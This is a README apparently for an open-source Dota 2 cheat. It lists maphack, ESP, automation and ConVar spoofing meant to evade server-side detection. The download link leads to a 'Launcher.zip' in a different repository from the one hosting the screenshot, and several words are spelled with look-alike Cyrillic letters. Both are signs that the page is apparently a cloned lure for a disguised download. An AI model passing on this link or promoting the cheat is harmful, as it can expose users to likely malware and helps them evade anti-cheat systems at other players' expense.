[Download](https://github.com/frankie90210/Dota2-Sv-panel-by-Coleman/releases/download/Release/Launcher.zip)


![v4 image](https://github.com/ExistedGit/Dota2Cheat/assets/66470490/88dbfa94-0ba3-4d53-b355-8cb18de98d71)

There weren't many open-source Dota cheаts. And so I decided to fix that. Written in C++20 with love.

Some SDK bits were fully or partionally taken from [McDota](https://github.com/LWSS/McDota) by LWSS, which D2C is inspired by.

Using [ImGui](https://github.com/ocornut/imgui) with DirectX 11 for the interface

also using [Minhook](https://github.com/TsudaKageyu/minhook) for them trampolines

also using Google's [Protocol Buffers](https://github.com/protocolbuffers/protobuf) for net message handling

Cheers to their wonderful creators!

# Features
To open the cheat menu, press Insert

WARNING! Legit features ahead, no scripts that play the game for you!

* Automation:
  * AutoAccept:
  * Customizаble delay
  * AutoHeal with customizable health tresholds
  * AutoMidas with customizable min XP reward
  * Bounty rune & Aegis snatcher
  * CastRedirection™(always casts on real hero)
  * Mana & HP abuse
  * AutoDodge for projectiles
 
  
* Information:
  * Maphack:
    * Teleport Tracker — draws enemy TPs on the map
    * Particle MapHack — shows particles in FoW and identifies their source()
  * AbilityESP™(abilities & items)
  * Bars:
    * Manabars
    * HP amount displayed on healthbar
  * Indicators
    * Speed indicator — shows whether you are faster or slower than the enemy
    * Kill indicator — shows if you can kill the enemy with a nuke(if your hero has one). If you can't, shows how much more health there is than the treshold.
  * Draw circles of custom radius around your hero(e. g. to see XP receiving range)
  * Shows point-cast spells(Sunstrike, Torrent, Light Strike Array)
  * Modifier Revealer:
    * Shows target-cast spells(Assassinate, Charge of Darkness)
    * Shows Linken's Sphere on everyone
    * Shows True Sight on allies and wards
  * Customizable enemy illusion coloring
  * Shows trajectories of enemy projectiles like Mirana's arrow and non-projectile abilities like Meat Hook
  
  
* Convars:
  * Using ConVar spoofing to counter serverside detection mechanisms 
  * customizable `dota_camera_distance` with proper `r_farz` and `fog_enable`(no clipping or blue fog)
  

* Utility:
  * Perfect Blink
  * BadCastPrevention™(prevents bad BHs and RPs and chronospheres)

* Changer:
  * Weather changing(Ash, Spring etc)
  * River painting
  * Unlocks emoticons
  * Dota Plus Unlocker
  * TreeChanger™
  * Allows playing with VPK mods
  
* Work in progress:
  * Roshan timer
